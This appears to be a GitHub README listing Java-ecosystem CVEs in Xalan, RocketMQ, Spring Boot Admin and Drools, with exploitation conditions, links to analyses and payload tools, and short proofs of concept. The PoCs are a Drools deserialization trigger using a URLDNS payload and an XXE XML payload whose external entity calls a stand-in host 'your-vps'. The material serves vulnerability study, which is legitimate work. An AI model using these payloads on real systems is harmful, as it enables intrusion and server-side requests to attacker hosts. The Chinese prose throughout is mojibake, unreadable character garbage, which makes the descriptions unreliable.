# Java-CVE-Lists

> è¿™ä¸ªä»“åº“ä¸»è¦ç”¨äºŽè®°å½•ä¸€äº›Javaç”Ÿæ€çš„**CVEç®€è¦è¯´æ˜Žã€åˆ©ç”¨æ¡ä»¶**ä»¥åŠ**ç›¸å…³å­¦ä¹ æ–‡ç« **ã€‚æ¯”è¾ƒç®€å•çš„CVEä¼šç»™å‡ºç®€æ˜“pocã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ¬ä»“åº“å…³æ³¨çš„æ˜¯ç›®å‰ä¸»æµçš„JavaæŠ€æœ¯ä¸­å­˜åœ¨çš„åŽ†å²æ¼æ´žï¼Œè€Œä¸æ˜¯è€å¤è‘£ã€‚ï¼ˆæŒç»­æ›´æ–°ä¸­...ï¼‰å¦‚æœ‰å»ºè®®å…¥é€‰æ¼æ´žï¼Œæ¬¢è¿ŽðŸ‘æå‡ºissueðŸ‘€ã€‚

- [Java-CVE-Lists](#java-cve-lists)
    - [Apache Xalan Java XSLT](#apache-xalan-java-xslt)
      - [CVE-2022-34169](#cve-2022-34169)
    - [RocketMQ](#rocketmq)
      - [CVE-2019-17572(ç›®å½•ç©¿è¶Š)](#cve-2019-17572ç›®å½•ç©¿è¶Š)
    - [Spring-boot-Admin](#spring-boot-admin)
      - [CVE-2022-46166(spelæ³¨å…¥)](#cve-2022-46166spelæ³¨å…¥)
    - [Drools](#drools)
      - [CVE-2022-1415](#cve-2022-1415)
      - [CVE-2021-41411](#cve-2021-41411)
---

### Apache Xalan Java XSLT

#### [CVE-2022-34169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34169)

##### åˆ©ç”¨æ¡ä»¶

> åªè¦æœ‰ XML xslt è½¬æ¢ä½¿ç”¨åœºæ™¯

##### æ¼æ´žè¯´æ˜Ž

- æŠŠxsltè½¬æ¢æˆclassçš„æ—¶å€™å­˜åœ¨æº¢å‡ºï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„xsltï¼Œé€šè¿‡xalanè½¬æ¢åŽå¾—åˆ°æ¶æ„çš„classï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¶æ„çš„classä¼šè¢«å®žä¾‹åŒ–å¯¼è‡´ä»£ç æ‰§è¡Œã€‚

##### æ¼æ´žåˆ†æž

- https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/

##### æŽ¨èå·¥å…·

- https://github.com/flowerwind/AutoGenerateXalanPayload

---

### RocketMQ

#### [CVE-2019-17572(ç›®å½•ç©¿è¶Š)](https://github.com/apache/rocketmq/issues/1637)

##### åˆ©ç”¨æ¡ä»¶

> RocketMQ4.6.0 æœ€æ–°ç‰ˆæœ¬
>
> autoCreateTopicEnable=trueé»˜è®¤è®¾ç½®

##### æ¼æ´žè¯´æ˜Ž

- è‡ªåŠ¨åˆ›å»ºä¸»é¢˜æ—¶å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥è¾¾åˆ°ä»»æ„åˆ›å»ºæ–°æ–‡ä»¶å¤¹çš„æ•ˆæžœã€‚

##### æ¼æ´žåˆ†æž

- https://github.com/luelueking/Java-CVE-Lists/tree/main/CVE-2019-17572

---

### Spring-boot-Admin

#### [CVE-2022-46166(spelæ³¨å…¥)](https://github.com/codecentric/spring-boot-admin/security/advisories/GHSA-w3x5-427h-wfq6)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
>
> < 2.6.10
>
> < 2.7.8
>
> < 3.0.0-M6

##### æ¼æ´žè¯´æ˜Ž

- spring-boot-adminçš„æ¶ˆæ¯é€šçŸ¥å™¨ä¸­messageå¯ä»¥æ‰§è¡Œä»»æ„spelè¡¨è¾¾å¼å¯¼è‡´ä»£ç æ³¨å…¥

##### æ¼æ´žçŽ¯å¢ƒåŠè¯¦æƒ…

- https://github.com/luelueking/Java-CVE-Lists/tree/main/CVE-2022-46166/

---

### Drools

#### [CVE-2022-1415](https://bugzilla.redhat.com/show_bug.cgi?id=2065505)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
> < drools 7.69.0.Final

##### æ¼æ´žè¯´æ˜Ž

- droolsä¸­æ²¡æœ‰å¯¹streamUtilsç›´æŽ¥è°ƒç”¨ObjectInputStreamçš„readObject()æ–¹æ³•å¹¶ä¸”æ²¡æœ‰è¿›è¡Œé™åˆ¶ï¼Œå¯èƒ½æˆä¸ºååºåˆ—åŒ–çš„å…¥å£

##### ç®€æ˜“poc

```java
        // ä½¿ç”¨URLDNSé“¾ç”Ÿæˆpayload.txt
        FileInputStream in = new FileInputStream("payload.txt");
        KnowledgeBuilderImpl builder = new KnowledgeBuilderImpl();
        Resource resource = new InputStreamResource(in);
        builder.addKnowledgeResource(resource, ResourceType.PKG,null);
```

#### [CVE-2021-41411](https://github.com/advisories/GHSA-rc57-9r3x-98cq)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
> < drools 7.59.0.Final

##### æ¼æ´žè¯´æ˜Ž

- XML External Entity (XXE) vulnerability in KieModuleMarshaller.java. The Validator class is not used correctly

##### ç®€æ˜“poc

```java
        FileInputStream fileInputStream = new FileInputStream("payload.xml");
        KieModuleModelImpl.fromXML(fileInputStream);
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
        <!ENTITY xxe SYSTEM "http://your-vps">
        ]>
<evil>&xxe;</evil>
```

